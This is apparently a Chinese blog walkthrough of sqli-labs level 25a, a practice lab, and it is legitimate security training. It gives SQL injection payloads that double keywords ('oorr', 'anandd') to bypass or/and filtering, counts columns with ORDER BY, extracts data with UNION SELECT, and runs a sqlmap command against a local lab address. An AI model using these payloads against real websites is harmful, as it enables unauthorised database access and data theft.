---
title: sqli-labs 第 25a 关（Advanced Blind SQL Injection）快速通关
url: https://mp.weixin.qq.com/s/wQ6aquG-hMevND-gCrPFbA
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:43:23.621920
---

# sqli-labs 第 25a 关（Advanced Blind SQL Injection）快速通关

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9Znf5plr4gHbLCLlLzpOU4ia03rRlt79Hib9qktib7m2nV1NoicLW2N75iahw/0?wx_fmt=jpeg)

# sqli-labs 第 25a 关（Advanced Blind SQL Injection）快速通关

原创

武文学网安
武文学网安

武文学网安

![]()

在小说阅读器中沉浸阅读

**大家好，我是武文。今天带大家一起挑战****sqli-labs 第 25a 关**。这一关和第25关注入技巧方法几乎一样，主要考察**盲注**在被精心设计的防御下的突破方法。

### 一、第 25a 关概述

首先，进入这关，你会发现页面依旧保持熟悉的形式：

```
```
?id=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9Z9LA0kBowbicM9rC3iaXXeXicI4G6zibriaSYhEq5uIO5jASibra66Hnwd7uQ/640?wx_fmt=png&from=appmsg)
```

但是，SQL 注入的经典技巧并没有奏效。你会发现，注入被屏蔽了，无法直接执行 `or 1=1` 等经典 payload。

这一关有很明显的提醒，or和and均被替换。绕过方式可以继续参照前面一关第25关的通过方法。[删掉 or / and 就安全了？sqli-labs 第 25 关彻底打脸](https://mp.weixin.qq.com/s?__biz=MzY0MDE4OTg4Mw==&mid=2247484423&idx=1&sn=ba635a8b91ac2e49ba7de91ec401b6c0&scene=21#wechat_redirect)

二、首先做闭合符号测试

在做闭合符号测试的时候，发现这一关卡并没有单、双引号和括号的闭合方式。可以通过一下方式验证：

```
?id=1' --+                 页面错误?id=1' oorr 1=1 --+        页面错误?id=1' anandd 1=1 --+       页面错误?id=1 oorr 1=1 --+          页面正常?id=1 anandd 1=1            页面正常?id=1 anandd 1=2            页面错误
```

通过测试，我们发现这一关卡并没有引号和括号作为闭合符。但有明显的注入点，接下来就是判断注入方式。

### 二、手动判断注入模式：

### 我们仍然秉承着手动判断注入方式+sqlmap自动注入测试的方式，来进行学习加练习。

### 2.1 盲注

这一关的最关键特征就是：**盲注**。

通过前面闭合方式测试，知道页面有两种不同的方式。

|  |  |
| --- | --- |
| ![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9Zgk5EDYsNYqpic3dpUWCClZXAycI9JgjlVaX2Bu5CuDgfrxd1LYibzW8w/640?wx_fmt=png&from=appmsg) | ![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZM5u6eXia8fYPKqZy8mNrlFqUvrwrHFtEiaqHBrjjsRv4F1Fm26n84CBA/640?wx_fmt=png&from=appmsg) |

可以判断出当前页面可以进行盲注。

2.2 显错注入

构造url：

```
?id=1 anandd updatexml(1,concat(0x7e,database(),0x7e),1)
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9Zv1sukT3oUeBriaoxq62ia5FF3CRVKGam94pgibkE9Bc3ECaAGmkagld2Q/640?wx_fmt=gif&from=appmsg)

可以看到，无法进行XPATH的显错注入

2.3 尝试UNION注入

首先判断当前查询列数：

```
?id=1 oorrder by 1?id=1 oorrder by 2?id=1 oorrder by 3?id=1 oorrder by 4
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZM3hib8aWST811jwzAMaUDxCmpktIrlCGJJLAib9HGkf2jsGQFHQu6UiaQ/640?wx_fmt=gif&from=appmsg)

在order by 4的时候出现错误，说明当前查询列数为3。

判断是否有显示位：

```
?id=-1 union select 1,2,3
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZCjYhH4HKqN6u0b6gU5HOmTRzcjJLv1z9E4qtUuiabib0kq8h7qWia554Q/640?wx_fmt=gif&from=appmsg)

可以得到页面显示位是2，3。我们可以通过选择3来作为我们的显示位进行数据展示：

```
?id=-1 union select 1,2,database()
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9Zr4JGs7G2icoAHF5zIqfic2J3OD4DbWpEjHTBKSbgCnBLGG7JDQicoTyXw/640?wx_fmt=gif&from=appmsg)

目前利用手工方式成功判断出存在盲注，union查询注入两种方式。

### 三、利用sqlmap自动测试：

```
python sqlmap.py -u "http://192.168.1.9:8080/Less-25a/?id=1" -p id --level=5 --batch
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZnsqdIFADyuXXSN1xhWUs3AlSj5N1WBwvyUY9FKCy3ibl1uR1twUwllQ/640?wx_fmt=gif&from=appmsg)

### 可以看到sqlmap能够成功验证我们的判断。

###

### 四、总结

**这一关和前面第25关通关方式**除了没有闭合符号，其他基本**一致。算是对第25关的加深印象吧**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

武文学网安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过